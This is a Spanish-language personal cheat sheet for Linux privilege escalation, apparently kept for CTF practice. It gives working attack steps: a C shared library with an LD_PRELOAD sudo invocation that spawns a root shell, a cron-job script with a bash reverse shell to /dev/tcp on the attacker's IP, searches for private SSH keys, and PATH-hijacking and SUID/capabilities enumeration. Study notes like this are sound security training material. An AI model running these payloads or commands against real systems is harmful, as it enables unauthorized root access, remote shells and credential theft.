## ENUMERACIÓN:
- Correr linPeas/linEnum/Linux Exploit Suggester...

## KERNEL EXPLOIT:
1. Identificar la versión de Linux (lsb_release -a, uname -r, cat /etc/*release)
2. Buscar si hay un exploit para ella (https://www.linuxkernelcves.com/cves puede ser de ayuda)
3. Pasar el exploit a la máquina (simple HTTP server y wget)
4. Correr el exploit

## SUDO:
- `sudo -l` para ver los comandos que el usuario puede ejecutar con sudo
- Si la variable `env_keep` está con `LD_PRELOAD --> env_keep+=LD_PRELOAD`:
  - Permite cargar librerías compartidas
  - Crear un programa como el siguiente para generar una shell.c:
    ```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
    `
  - Compilar con 'gcc -fPIC -shared -o shell.so shell.c -nostartfiles'
  - Y para ejecutarlo, vale cualquier comando que pueda ejecutar con sudo de la siguiente manera:
    ```bash
    sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
    ```
    (Suponiendo que find se puede ejecutar con sudo)

## SUID:
1. Mostrar todos los archivos que tienen el bit SUID activo: `find / -type f -perm -04000 -ls 2>/dev/null`
2. Se puede buscar en gtfobins (https://gtfobins.github.io/#+suid)
3. **NOTA:** El suid se ignora en todos los scripts ejecutables interpretados (aquellos que comiencen por #!). Por lo que normalmente, un script creado manualmente con el SUID activado no valdrá para escalar privilegios

## CAPABILITIES:
- `getcap -r / 2>/dev/null` (puede haber, por ejemplo, un UID activado que no habría aparecido en el punto anterior)

## CRON JOBS:
- `cat /etc/crontab` --> muestra todos los cron jobs activos
- `crontab -l`
- `cat /var/spool/cron/crontabs`
- Puede haber tanto cron jobs que podemos modificar como cron jobs inservibles cuyos archivos no han sido eliminados y podemos crear un archivo con el mismo nombre
- Un script para proporcionar una shell de root (este archivo va a ser ejecutado como root al ser cron job):
```bash
  #!/bin/bash
  bash -i >& /dev/tcp/'tu ip'/'puerto' 0>&1
```

Otras formas de explotar cron jobs:
- Programa sin ruta absoluta --> (path hijacking)
- Wildcards (https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/)
	- tar, zip, 7z, chown, chmod
	- se ejecuta un comando sobre todos los archivos de un directorio con \*. La idea es crear como checkpoints en el directorio que serán tomados como argumentos o algo así (mirar en la web apartado "exploiting wildcards in commands")

Es posible también que haya algún programa ejecutandose cada cierto tiempo, pero no aparezca en /etc/crontab, es decir, que no aparezca en la crontab. Esto ocurre porque en /etc/crontab, solo aparecen los cronjobs del sistema, y existen a su vez cronjobs de usuario. Para checkear esto, se puede crear un script que monitorice de forma continua todos los scripts que se ejecuten y los muestre. También se puede utilizar la herramienta PSPY.

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm
	exit 1
}

#CTRL+C
trap ctrl_c INT

old_process="$(ps -eo command)"

while true; do
	new_process="$(ps -eo command)"
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|kworker"
	old_process=$new_process
done
```
(copiado de https://www.youtube.com/watch?v=d3tzLtW6SWE ,minuto 1:30:00)

## Llaves ssh

Buscar llaves ssh accesibles

```
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```

Más info [[Llaves SSH]]
## PATH (ver TryHackMe Linux Privilege Escalation Path):

1. Primero comprobar si alguno de los directorios de $PATH es modificable por nosotros `find / -writable 2>/null | grep -v proc`
2. Si lo es, podemos crear archivos en ese directorio, los cuales si otro programa cualquiera intenta ejecutar los buscará ahí.
3. Si no lo es, ver si podemos modificar la variable PATH y podemos añadir tmp o algún directorio donde podamos escribir para hacer lo mismo (para añadir a PATH: `export PATH=/tmp:$PATH`
4. Para esta idea, es necesario encontrar un ejecutable que trate de ejecutar un archivo que no encuentra, que no existe, etc. Entonces, nosotros añadimos a $PATH un archivo creado por nosotros, y el ejecutable anterior va a acabar llamando a nuestro nuevo archivo.

## PATH HIJACKING:

- Consiste en modificar la variable PATH y añadir una carpeta donde podamos escribir y ahí crear un ejecutable llamado como una herramienta, por ejemplo. Ejemplo: Un programa ejecuta la siguiente línea (cp ...), creamos un programa llamado cp y añadimos la carpeta donde está a la variable PATH la primera.

## PUERTOS INTERNOS

Ver los puertos abiertos de forma interna, para ver si hay alguno diferente a los expuestos al exterior.
- `ps -f aux`
- `netstat -na -p tcp`
Si se encuentra algo interesante (mirar en la carpeta [[Servicios explotados en CTF/Elevar privilegios/General]] ), acceder haciendo un [[Port forwarding]]

